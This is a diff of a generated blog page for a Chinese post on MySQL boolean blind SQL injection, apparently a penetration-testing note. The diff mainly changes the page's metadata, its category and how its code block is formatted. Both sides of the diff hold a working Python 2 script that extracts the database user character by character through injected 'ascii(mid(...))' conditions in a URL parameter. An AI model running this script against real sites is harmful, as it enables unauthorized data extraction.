@@ -86,7 +86,7 @@
 <meta property="og:url" content="http://yoursite.com/2015/07/15/Mysql布尔盲注脚本/index.html">
 <meta property="og:site_name" content="wps2015的博客">
 <meta property="og:description" content="当某个盲注点不能使用工具（一般有waf限制）的时候，可以使用这个脚本用于证明漏洞的存在">
-<meta property="og:updated_time" content="2016-05-12T01:48:11.797Z">
+<meta property="og:updated_time" content="2016-05-15T12:35:01.046Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Mysql布尔盲注脚本">
 <meta name="twitter:description" content="当某个盲注点不能使用工具（一般有waf限制）的时候，可以使用这个脚本用于证明漏洞的存在">
@@ -283,8 +283,8 @@
               <span class="post-meta-item-text">分类于</span>
               
                 <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/编程/" itemprop="url" rel="index">
-                    <span itemprop="name">编程</span>
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
                   </a>
                 </span>
 
@@ -324,38 +324,7 @@
 
       
         <p>当某个盲注点不能使用工具（一般有waf限制）的时候，可以使用这个脚本用于证明漏洞的存在<a id="more"></a></p>
-<pre><code class="python?linenums">#! usr/bin/env python
-# -*- coding: utf-8 -*-
-
-import httplib
-import time
-import string
-import sys
-import random
-import urllib
-
-headers = {&apos;User-Agent&apos;: &apos;Mozilla/5.0 Chrome/28.0.1500.63&apos;,}
-payloads = list(&apos;abcdefghijklmnopqrstuvwxyz0123456789@_.&apos;)
-print &apos;start to retrive MySQL user:&apos;
-user = &apos;&apos;
-for i in range(1,21):
-    for payload in payloads:
-        conn = httplib.HTTPConnection(&apos;www.example.com&apos;, timeout=4)      #连接,host
-        s = &quot;ascii(mid(lower(user()),%s,1))=%s&quot; % (i, ord(payload))       #payload
-        conn.request(method=&apos;GET&apos;,url=&quot;/php/1.php?id=1 and %s&quot; % s,headers = headers)  #url
-        html_header= conn.getresponse().read()
-        length=len(html_header)
-        if length&gt;10000:
-            user+=payload
-            sys.stdout.write(&apos;\r[In progress] %s&apos; % user)
-            sys.stdout.flush()
-            break
-        else:
-            print &apos;.&apos;,
-            conn.close()
-
-print &apos;\n[Done]MySQL user is&apos;, user
-</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#! usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import httplib</span><br><span class="line">import time</span><br><span class="line">import string</span><br><span class="line">import sys</span><br><span class="line">import random</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">headers = &#123;&apos;User-Agent&apos;: &apos;Mozilla/5.0 Chrome/28.0.1500.63&apos;,&#125;</span><br><span class="line">payloads = list(&apos;abcdefghijklmnopqrstuvwxyz0123456789@_.&apos;)</span><br><span class="line">print &apos;start to retrive MySQL user:&apos;</span><br><span class="line">user = &apos;&apos;</span><br><span class="line">for i in range(1,21):</span><br><span class="line">	for payload in payloads:</span><br><span class="line">		conn = httplib.HTTPConnection(&apos;www.example.com&apos;, timeout=4)      #连接,host</span><br><span class="line">		s = &quot;ascii(mid(lower(user()),%s,1))=%s&quot; % (i, ord(payload))       #payload</span><br><span class="line">		conn.request(method=&apos;GET&apos;,url=&quot;/php/1.php?id=1 and %s&quot; % s,headers = headers)  #url</span><br><span class="line">		html_header= conn.getresponse().read()</span><br><span class="line">		length=len(html_header)</span><br><span class="line">		if length&gt;10000:</span><br><span class="line">			user+=payload</span><br><span class="line">			sys.stdout.write(&apos;\r[In progress] %s&apos; % user)</span><br><span class="line">			sys.stdout.flush()</span><br><span class="line">			break</span><br><span class="line">		else:</span><br><span class="line">			print &apos;.&apos;,</span><br><span class="line">			conn.close()</span><br><span class="line"></span><br><span class="line">print &apos;\n[Done]MySQL user is&apos;, user</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -467,7 +436,7 @@ print &apos;\n[Done]MySQL user is&apos;, user
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">11</span>
+              <span class="site-state-item-count">12</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -484,7 +453,7 @@ print &apos;\n[Done]MySQL user is&apos;, user
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-count">8</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
